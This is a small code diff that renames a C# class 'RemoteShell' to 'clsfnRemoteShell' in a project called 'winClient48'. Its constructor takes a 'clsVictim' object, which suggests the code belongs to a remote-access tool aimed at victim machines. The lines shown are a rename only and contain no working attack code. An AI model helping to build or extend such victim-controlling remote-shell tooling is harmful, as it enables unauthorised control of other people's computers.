@@ -10,7 +10,7 @@ using System.Windows.Forms;
 
 namespace winClient48
 {
-    public class RemoteShell
+    public class clsfnRemoteShell
     {
         private clsVictim v;
 
@@ -46,7 +46,7 @@ namespace winClient48
             Keys.Right,
         };
 
-        public RemoteShell(clsVictim v, string exePath, string initPath)
+        public clsfnRemoteShell(clsVictim v, string exePath, string initPath)
         {
             last_pattern = string.Empty;
             idx_suggestion = 0;
